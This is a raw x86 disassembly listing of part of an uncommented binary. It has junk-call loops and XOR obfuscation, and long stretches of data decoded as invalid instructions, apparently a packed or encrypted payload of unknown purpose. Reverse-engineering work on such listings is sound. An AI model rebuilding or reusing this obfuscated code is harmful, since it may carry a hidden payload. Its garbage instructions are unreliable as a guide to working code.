  4032b6:	cmp    DWORD PTR ds:0x41074b,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41089f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x443004
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x448980,0x448994
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x44521c
  4032fd:	xor    DWORD PTR ds:0x44e428,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	cld    
  403319:	sbb    al,0xef
  40331b:	in     al,dx
  40331c:	out    dx,al
  40331d:	add    bh,BYTE PTR [esp+edi*2-0xc]
  403321:	jl     0x40339f
  403323:	jl     0x403343
  403325:	sbb    ecx,DWORD PTR [esi+0x2708af8e]
  40332b:	mov    al,0x77
  40332d:	clc    
  40332e:	push   0x17339d27
  403333:	in     al,dx
  403334:	(bad)  
  403335:	cld    
  403336:	dec    esp
  403337:	(bad)  
  403338:	xor    bh,BYTE PTR [edx-0x76]
  40333b:	pop    ebx
  40333c:	stc    
  40333d:	jle    0x403353
  40333f:	daa    
  403340:	push   esi
  403341:	cmp    eax,0x8cb09aff
  403346:	mov    bl,bl
  403348:	pop    ss
  403349:	outs   dx,BYTE PTR ds:[esi]
  40334a:	sbb    eax,0xe5a6bb99
  40334f:	mul    DWORD PTR [eax-0x54]
  403352:	cmp    al,0xfb
  403354:	into   
  403355:	pop    edx
  403356:	xchg   esi,eax
  403357:	sub    al,0x65
  403359:	ja     0x403326
  40335b:	call   0x158e9168
  403360:	cmp    BYTE PTR [edx+0x40],bh
  403363:	pop    ebx
  403364:	and    eax,0x5a843e17
  403369:	xchg   ebx,eax
  40336a:	les    ebx,FWORD PTR [esi]
  40336c:	or     ebx,DWORD PTR [ecx]
  40336e:	imul   eax,ebx,0xffffffa5
  403371:	icebp  
  403372:	pushf  
  403373:	cmp    bh,BYTE PTR ds:0xe0be538b
  403379:	into   
  40337a:	mov    dh,0x1e
  40337c:	pop    es
  40337d:	or     bl,0x25
  403380:	sar    ah,cl
  403382:	mov    eax,0x51676abc
  403387:	enter  0x72b3,0xa1
  40338b:	push   ecx
  40338c:	xchg   esp,eax
  40338d:	push   esp
  40338e:	mov    ah,BYTE PTR [esi-0x68]
  403391:	mov    BYTE PTR [eax],al
  403393:	adc    eax,0x4ea97131
  403398:	lods   eax,DWORD PTR ds:[esi]
  403399:	pop    ebp
  40339a:	dec    esp
  40339b:	dec    bh
  40339d:	push   ss
  40339e:	mov    esp,0x6a10a374
  4033a3:	loopne 0x403394
  4033a5:	mov    eax,ds:0xa00b7cb
  4033aa:	lea    ebx,[edi+0x2b0c758b]
  4033b0:	ret    0xa0e9
  4033b3:	add    BYTE PTR [eax],al
  4033b5:	add    BYTE PTR [esi+0x4698c424],bl
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	arpl   cx,di
  4033c4:	pop    es
  4033c5:	in     eax,0x66
  4033c7:	add    bh,BYTE PTR [esp+edi*2-0xc]
  4033cb:	jl     0x403449
  4033cd:	jl     0x403414
  4033cf:	stos   DWORD PTR es:[edi],eax
  4033d0:	mov    ds:0x13d008c4,al
  4033d5:	add    eax,0x4e1ba382
  4033da:	ds popa 
  4033dc:	mov    eax,ds:0x49c29455
  4033e1:	(bad)  
  4033e2:	jge    0x4033df
  4033e4:	call   0xda78:0xe8203d16
  4033eb:	shr    DWORD PTR [eax],cl
  4033ed:	std    
  4033ee:	fiadd  WORD PTR [edx]
  4033f0:	das    
  4033f1:	rol    BYTE PTR [esi+0x60550772],cl
  4033f7:	rol    DWORD PTR [ecx*8+0x636c3121],1
  4033fe:	pop    ebp
  4033ff:	cmp    DWORD PTR [ebp+0x1799449a],ebx
  403405:	cld    
  403406:	or     eax,0xfc69d925
  40340b:	or     DWORD PTR [edx],edx
  40340d:	xor    eax,DWORD PTR [edi+edi*8-0x323bf60]
  403414:	sub    eax,0x38f32924
  403419:	jae    0x403427
  40341b:	push   ebp
  40341c:	add    eax,0x40aa5fec
  403421:	cmc    
  403422:	inc    ebp
  403423:	outs   dx,DWORD PTR ds:[esi]
  403424:	or     al,0xd6
  403426:	mov    ds:0x74bd3b26,al
  40342b:	mov    al,0xe3
  40342d:	and    esp,esi
  40342f:	mov    ds:0xa86732ed,al
  403434:	push   ebx
  403435:	mov    WORD PTR [ebx-0x60],es
  403438:	or     BYTE PTR [esi+0x52],ch
  40343b:	inc    edx
  40343c:	cli    
  40343d:	push   ecx
  40343e:	push   edi
  40343f:	xchg   cl,ch
  403441:	pop    esi
  403442:	test   al,0x26
  403444:	(bad)  
  403445:	call   0x1273:0x78dede
  40344c:	pusha  
  40344d:	xor    al,BYTE PTR [esp+edx*8-0x6e]
  403451:	pop    ebp
  403452:	push   ss
  403453:	ror    BYTE PTR [edi+0x3bc133f1],cl
  403459:	(bad)  
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x445224
  403465:	add    eax,DWORD PTR ds:0x44521c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0xc083fc0e
  403488:	jge    0x403433
  40348a:	inc    BYTE PTR ds:0x7cf47c7c
  403490:	jl     0x40350e
  403492:	xchg   edi,eax
  403493:	into   
  403494:	xor    bh,BYTE PTR [edi-0xa071f06]
  40349a:	sub    ch,dl
  40349c:	fwait
  40349d:	das    
  40349e:	sub    esp,esi
  4034a0:	push   eax
  4034a1:	push   esp
  4034a2:	or     BYTE PTR [eax],0x3c
  4034a5:	test   al,0x64
  4034a7:	adc    BYTE PTR [eax-0x64],bh
  4034aa:	mov    edx,0x456352c
  4034af:	mov    ds:0xd0fb566f,eax
  4034b4:	mov    al,dl
  4034b6:	sbb    al,0x7c
  4034b8:	and    DWORD PTR [edi],ebx
  4034ba:	test   BYTE PTR [edi-0x14b220c8],0xf
  4034c1:	lds    ebp,FWORD PTR [ebp+ebp*2-0x5dad0c14]
  4034c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c9:	addr16 clc 
  4034cb:	mov    al,es:0x6ce1d8f7
  4034d1:	add    bh,BYTE PTR [esi]
  4034d3:	sbb    si,WORD PTR [edx-0x7d]
  4034d7:	dec    edi
  4034d8:	xor    ebx,DWORD PTR [ecx]
  4034da:	repnz loop 0x4034f0
  4034dd:	cmp    ebx,DWORD PTR [edi-0x63]
  4034e0:	or     DWORD PTR [ecx+0x13b4564f],ebx
  4034e6:	repnz mov ds:0xd252b94f,eax
  4034ec:	sub    BYTE PTR [edi-0x19],ch
  4034ef:	retf   0x82dc
  4034f2:	sahf   
  4034f3:	stos   BYTE PTR es:[edi],al
  4034f4:	out    dx,eax
  4034f5:	call   FWORD PTR [ebx-0x29]
  4034f8:	pop    ss
  4034f9:	adc    al,0x74
  4034fb:	adc    BYTE PTR [ebx+ebx*4+0x38],bl
  4034ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403500:	loope  0x403563
  403502:	cmp    eax,0xb3ca6d97
  403507:	test   BYTE PTR [ebx-0x7e],bh
  40350a:	push   ss
  40350b:	mov    edi,0xee273721
  403510:	in     eax,0x40
  403512:	jb     0x40349e
  403514:	(bad)  
  403515:	(bad)  [ebx]
  403517:	push   eax
  403518:	gs ds add eax,edx
  40351c:	mov    ds:0x44521c,eax
  403521:	mov    eax,DWORD PTR [ebp+0xc]
  403524:	xor    eax,ecx
  403526:	add    eax,edx
  403528:	mov    ds:0x445224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x445224
  403537:	mov    ds:0x44521c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x44521c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x448984
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44e424,0x11
  40356b:	cmp    DWORD PTR ds:0x44e424,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44e424,0x1d
  40357f:	jne    0x403595
  403585:	push   0x4107d0
  40358a:	push   0x4107e6
  40358f:	call   DWORD PTR ds:0x44334c
  403595:	mov    eax,ds:0x44e424
  40359a:	dec    eax
  40359b:	mov    ds:0x44e424,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x44b6dc,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x44b6d0
  4035bf:	xor    DWORD PTR ds:0x44b6e0,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x4247c6
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x40362d
  4035e9:	in     al,dx
  4035ea:	aaa    
  4035eb:	mov    edx,0x7c7c0476
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	mov    esi,ebx
  4035f6:	dec    ebp
  4035f7:	dec    esp
  4035f8:	xor    DWORD PTR [edi],ebp
  4035fa:	sub    BYTE PTR [ecx+0x200e76fb],ah
  403600:	cwde   
  403601:	(bad)  
  403602:	repnz push cs
  403604:	mov    esp,ebx
  403606:	outs   dx,DWORD PTR ds:[esi]
  403607:	cmp    ebx,DWORD PTR [ebp-0x2d]
  40360a:	cmp    eax,0xb8acd3dd
  40360f:	cmp    DWORD PTR [eax-0x556ca03c],eax
  403615:	test   DWORD PTR [ebp+0x5e6cd994],esi
  40361b:	sbb    eax,0x868f4690
  403620:	hlt    
  403621:	cwde   
  403622:	jmp    0x29ca:0x4236632a
  403629:	dec    eax
  40362a:	ret    
  40362b:	and    eax,0xba0ac91b
  403630:	sti    
  403631:	int3   
  403632:	arpl   WORD PTR [esi-0x4faa7a1d],si
  403638:	mov    DWORD PTR [ecx+0xb],0xade51b7a
  40363f:	jmp    0xa80619d
  403644:	dec    ebx
  403645:	push   edx
  403646:	or     al,0x6
  403648:	xchg   ebx,eax
  403649:	loopne 0x403653
  40364b:	mov    edx,0x9900ca03
  403650:	(bad)  
  403651:	(bad)  
  403652:	push   ebp
  403654:	retf   
  403655:	js     0x4036b7
  403657:	out    0xa9,eax
  403659:	cmp    DWORD PTR [esi],ebx
  40365b:	mov    cl,0x7a
  40365d:	repz fnstsw WORD PTR [ecx+0x75]
  403661:	ror    BYTE PTR [eax-0xf4ed9f2],cl
  403667:	cld    
  403668:	jno    0x403695
  40366a:	mov    ds:0x4a68d4db,eax
  40366f:	xchg   edx,eax
  403670:	xor    DWORD PTR [ebp-0x73],esi
  403673:	jmp    0x91b4:0xbc2fd4c7
  40367a:	pop    ss
  40367b:	cmp    BYTE PTR [esi-0x3e],al
  40367e:	push   ebp
  40367f:	(bad)
  403682:	out    dx,al
  403683:	cmp    bl,BYTE PTR [eax+0x3b]
  403686:	add    eax,0x610f523f
  40368b:	mov    edx,0x960c8685
  403690:	sahf   
  403691:	js     0x4036bd
  403693:	mov    eax,ds:0xaf8de076
  403698:	lahf   
  403699:	dec    ecx
  40369a:	popa   
  40369b:	ret    0x8084
  40369e:	arpl   WORD PTR [eax+0x42],sp
  4036a1:	test   al,0x91
  4036a3:	(bad)  
  4036a5:	arpl   sp,cx
  4036a7:	fld    DWORD PTR [esi-0x28454058]
  4036ad:	add    BYTE PTR [esi],bh
  4036af:	fiadd  WORD PTR [ecx-0x2e]
  4036b2:	push   eax
  4036b3:	outs   dx,BYTE PTR ds:[esi]
  4036b4:	dec    edx
  4036b5:	adc    ebx,esp
  4036b7:	cs loopne 0x403710
  4036ba:	add    ecx,esp
  4036bc:	push   ecx
  4036bd:	stos   BYTE PTR es:[edi],al
  4036be:	and    dh,ch
  4036c0:	jp     0x40372c
  4036c2:	aaa    
  4036c3:	xor    ebx,0xfffffff7
  4036c6:	xor    edi,ebx
  4036c8:	mov    ah,0x6c
  4036ca:	pop    esi
  4036cb:	cmp    ebx,ebp
  4036cd:	clc    
  4036ce:	cld    
  4036cf:	inc    esp
  4036d0:	cdq    
  4036d1:	sub    dl,ah
  4036d3:	lahf   
  4036d4:	mov    ecx,0xcdde114e
  4036d9:	adc    DWORD PTR [ecx+0x20d6d6e6],0x7d
  4036e0:	xchg   ebx,eax
  4036e1:	pop    esp
  4036e2:	mov    bl,0x51
  4036e4:	cmp    BYTE PTR [ecx+0x14],dl
  4036e7:	pop    edx
  4036e8:	int3   
  4036e9:	jl     0x4036db
  4036eb:	js     0x40373a
  4036ed:	xchg   bh,al
  4036ef:	rcl    DWORD PTR [ecx-0x58],1
  4036f2:	daa    
  4036f3:	mov    ds:0x26f7e582,eax
  4036f8:	iret   
  4036f9:	out    dx,eax
  4036fa:	inc    ecx
  4036fb:	xchg   edi,eax
  4036fc:	xor    al,0x15
  4036fe:	popa   
  4036ff:	pop    ebx
  403700:	pop    ebp
  403701:	mov    DWORD PTR [esi+esi*4-0x65],edx
  403705:	shr    BYTE PTR [edi-0x1b],0x58
  403709:	or     ch,BYTE PTR [edi+0x5c01fcc7]
  40370f:	pusha  
  403710:	clc    
  403711:	stc    
  403712:	mov    bh,0x53
  403714:	ret    
  403715:	pop    esp
  403716:	sbb    DWORD PTR [esp+eiz*8-0x39c13f03],ecx
  40371d:	cli    
  40371e:	popa   
  40371f:	xchg   edx,eax
  403720:	retf   
  403721:	xor    al,0xb
  403723:	call   0xcfd8ceee
  403728:	xchg   edi,eax
  403729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40372a:	fwait
  40372b:	sub    dh,BYTE PTR [edx-0x5d]
  40372e:	push   cs
  40372f:	(bad)  
  403730:	ror    BYTE PTR [eax],1
  403732:	pop    esi
  403733:	or     eax,0x1aa04fb7
  403738:	push   ds
  403739:	mov    edi,0x4589fdb4
  40373e:	sar    BYTE PTR [eax+0x7510857],0x33
  403745:	sar    BYTE PTR [ecx+0x32729e],1
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x448990
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x4489bc
  40375c:	mov    edx,DWORD PTR ds:0x4489c4
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x448984,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x4247c6,0x0
  403783:	mov    edx,DWORD PTR ds:0x4247c6
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x4247c6,edx
  403790:	cmp    DWORD PTR ds:0x4247c6,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x41073f
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x443350
  4037b0:	cmp    DWORD PTR ds:0x4247c6,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x4247c6
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x4247c6,edx
  4037cc:	cmp    DWORD PTR ds:0x4247c6,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x44b6cc
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x4489a4
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x4247ca,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x4247ca
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x4247ca,edx
  40381d:	cmp    DWORD PTR ds:0x4247ca,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x4247ca,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x443354
  403847:	cmp    DWORD PTR ds:0x4247ca,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x4247ca
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x4247ca,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x448994,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x4247da,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x41075b,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x448980,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x4247c6,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x44b6cc,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x44e41c,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x44e41c
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x44e41c,edi
  4038e8:	cmp    DWORD PTR ds:0x44e41c,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x44e41c,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x443358
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x448984,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x44b6e4,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	lods   eax,DWORD PTR gs:[esi]
  403941:	pop    es
  403942:	repz into 
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	push   ebx
  40394c:	dec    edx
  40394d:	sbb    eax,0x4c694c9b
  403952:	outs   dx,DWORD PTR ds:[esi]
  403953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403954:	nop
  403955:	mov    dh,0xbd
  403957:	xchg   edi,eax
  403958:	xor    eax,0x7a623bbf
  40395d:	idiv   BYTE PTR [ebp+eax*2-0x54]
  403961:	ret    
  403962:	inc    ebp
  403963:	jge    0x403945
  403965:	push   esp
  403966:	mov    ebp,0xfa667c69
  40396b:	div    DWORD PTR [ebp-0x299b6fc4]
  403971:	mov    BYTE PTR [esi],bh
  403973:	dec    edi
  403974:	mov    cl,0x7f
  403976:	cld    
  403977:	add    al,0x4d
  403979:	jmp    0x4039a0
  40397b:	mov    WORD PTR [ebx],ds
  40397d:	dec    esi
  40397e:	mov    ah,0xc7
  403980:	retf   0x34c4
  403983:	xchg   ebx,eax
  403984:	(bad)  
  403985:	(bad)  
  403987:	inc    edx
  403988:	es dec ebp
  40398a:	pusha  
  40398b:	lahf   
  40398c:	test   eax,0x8c48c933
  403991:	jb     0x403925
  403993:	(bad)  
  403994:	jl     0x4039ae
  403996:	jmp    0x403971
  403998:	mov    al,ds:0xa3c218f9
  40399d:	pop    DWORD PTR [esi+0x3e]
  4039a0:	pop    ebx
  4039a1:	xor    BYTE PTR [esi],dl
  4039a3:	stos   DWORD PTR es:[edi],eax
  4039a4:	pop    ecx
  4039a5:	dec    edi
  4039a6:	pop    es
  4039a7:	loopne 0x403992
  4039a9:	mov    dl,0xfc
  4039ab:	data16 add BYTE PTR [edi+eiz*1-0x71765f04],ch
  4039b3:	mov    edi,0x86c16571
  4039b8:	jne    0x4039cc
  4039ba:	jmp    0xb639c918
  4039bf:	int3   
  4039c0:	jbe    0x403a10
  4039c2:	pop    esp
  4039c3:	ror    al,cl
  4039c5:	pop    eax
  4039c6:	jne    0x403a11
  4039c8:	data16 repz mov cl,0xcc
  4039cc:	in     al,0x4e
  4039ce:	(bad)  
  4039cf:	lsl    edx,WORD PTR [edx]
  4039d2:	imul   esi,DWORD PTR [edx-0x76f3a3bd],0x8b842fc4
  4039dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039dd:	rcl    DWORD PTR [ebx+esi*4],1
  4039e0:	shl    DWORD PTR [edx],cl
  4039e2:	retf   0x5bd3
  4039e5:	cmp    BYTE PTR [esi+0x12],dl
  4039e8:	sbb    esp,DWORD PTR [edx]
  4039ea:	scas   eax,DWORD PTR es:[edi]
  4039eb:	outs   dx,DWORD PTR ds:[esi]
  4039ec:	xor    al,0xa2
  4039ee:	aad    0x58
  4039f0:	jge    0x4039ab
  4039f2:	loop   0x403a68
  4039f4:	jmp    0xd5619332
  4039f9:	pop    es
  4039fa:	mov    bh,0x96
  4039fc:	fild   WORD PTR [ebp+0x18]
  4039ff:	xchg   esi,eax
  403a00:	push   edi
  403a01:	cdq    
  403a02:	fnstenv [edi]
  403a04:	(bad)  
  403a05:	in     eax,dx
  403a06:	popf   
  403a07:	push   ebx
  403a08:	leave  
  403a09:	dec    esi
  403a0a:	dec    eax
  403a0b:	daa    
  403a0c:	out    0xec,al
  403a0e:	pop    edi
  403a0f:	add    BYTE PTR [esp+edi*2+0x74a68de5],ch
  403a16:	cmp    al,0xc2
  403a18:	pop    eax
  403a19:	cld    
  403a1a:	daa    
  403a1b:	enter  0xccd0,0x4f
  403a1f:	cmp    al,0x62
  403a21:	repz (bad) [esi]
  403a24:	sbb    al,BYTE PTR [ebx+eiz*4+0x5d]
  403a28:	mov    bh,0x99
  403a2a:	imul   ecx,ebx,0x7b
  403a2d:	call   0x60013004
  403a32:	dec    edi
  403a33:	xor    bl,bh
  403a35:	lods   al,BYTE PTR ds:[esi]
  403a36:	pop    edx
  403a37:	fmulp  st(7),st
  403a39:	stos   DWORD PTR es:[edi],eax
  403a3a:	jge    0x403ab9
  403a3c:	push   ecx
  403a3d:	retf   
  403a3e:	ret    0xc1b0
  403a41:	jnp    0x4039fa
  403a43:	jp     0x403a2e
  403a45:	or     DWORD PTR [di-0x684f],ebp
  403a4a:	push   ebx
  403a4b:	repz mov al,0xf5
  403a4e:	xlat   BYTE PTR ds:[ebx]
  403a4f:	mov    al,ds:0x16ee914c
  403a54:	cli    
  403a55:	push   ebp
  403a56:	pusha  
  403a57:	mov    eax,0xdd60b7f
  403a5c:	pushf  
  403a5d:	cld    
  403a5e:	shl    BYTE PTR [ecx-0x1dfdb366],0xc4
  403a65:	out    dx,al
  403a66:	inc    esp
  403a67:	stos   BYTE PTR es:[edi],al
  403a68:	pop    esp
  403a69:	inc    esp
  403a6a:	inc    edi
  403a6b:	sbb    DWORD PTR [esi],0xffffff83
  403a6e:	pop    ebx
  403a6f:	sub    ebp,DWORD PTR [eax+0x35]
  403a72:	std    
  403a73:	test   eax,0x465d4916
  403a78:	xchg   ebp,eax
  403a79:	jge    0x403a35
  403a7b:	inc    ebx
  403a7c:	rcl    DWORD PTR [edi-0x7fdea741],1
  403a82:	mov    dh,ah
  403a84:	fistp  WORD PTR [ecx-0x196aace5]
  403a8a:	gs popf 
  403a8c:	sti    
  403a8d:	mov    bl,0x9c
  403a8f:	call   0x2b8cb9e4
  403a94:	cli    
  403a95:	adc    DWORD PTR ds:0x44e410,0x1ab0
  403a9f:	mov    edx,DWORD PTR [ebp-0x4]
  403aa2:	xor    DWORD PTR ds:0x44b6e4,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x44b6e8,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44e414,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x41073f,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x448980,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x448980
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x448980,ebx
  403b02:	cmp    DWORD PTR ds:0x448980,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x448980,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x443008
  403b25:	cmp    DWORD PTR ds:0x448980,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x448980
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x448980,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x448980,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x448980
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x448980,ebx
  403b64:	cmp    DWORD PTR ds:0x448980,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x448980,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x4430d4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x4489ac
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x4247be,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	xchg   ebx,eax
  403bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc0:	sub    DWORD PTR [eax+0x7c7c0686],edx
  403bc6:	xor    al,0x7f
  403bc8:	jl     0x403c46
  403bca:	cmp    BYTE PTR ds:0xa5ee02a7,ah
  403bd0:	dec    eax
  403bd1:	outs   dx,DWORD PTR ds:[esi]
  403bd2:	add    ch,BYTE PTR [ecx]
  403bd4:	arpl   bx,dx
  403bd6:	das    
  403bd7:	mov    dl,0x9f
  403bd9:	inc    eax
  403bda:	int    0x36
  403bdc:	xchg   esi,eax
  403bdd:	dec    esi
  403bde:	inc    esi
  403bdf:	pop    ss
  403be0:	xchg   esi,eax
  403be1:	jmp    0x403b92
  403be3:	fisttp QWORD PTR [esi-0x33]
  403be6:	pop    ebp
  403be7:	repnz inc edi
  403be9:	in     al,0x16
  403beb:	mov    ecx,0x6273f5fd
  403bf0:	out    dx,eax
  403bf1:	lahf   
  403bf2:	mov    bl,0xb6
  403bf4:	jo     0x403c23
  403bf6:	push   ecx
  403bf7:	adc    WORD PTR cs:[ebp-0x1d406819],dx
  403bff:	rcl    ecx,cl
  403c01:	xchg   esi,eax
  403c02:	xchg   ecx,ebp
  403c04:	sbb    BYTE PTR [ebx],bl
  403c06:	inc    esp
  403c07:	aaa    
  403c08:	sahf   
  403c09:	lods   al,BYTE PTR ds:[esi]
  403c0a:	xor    al,BYTE PTR [edx]
  403c0c:	js     0x403c7a
  403c0e:	inc    esp
  403c0f:	test   BYTE PTR [ecx],dl
  403c11:	lea    esi,[esi]
  403c13:	ins    DWORD PTR es:[edi],dx
  403c14:	dec    eax
  403c15:	retf   0x3284
  403c18:	leave  
  403c19:	pop    edi
  403c1a:	or     al,0xc5
  403c1c:	xchg   ebp,eax
  403c1d:	inc    edi
  403c1e:	lods   eax,DWORD PTR ds:[esi]
  403c1f:	jns    0x403c17
  403c21:	sbb    BYTE PTR [esi-0x66],0xb7
  403c25:	inc    esp
  403c26:	sub    BYTE PTR ds:0x7c0508c3,dl
  403c2c:	popf   
  403c2d:	jo     0x403ca0
  403c2f:	(bad)  
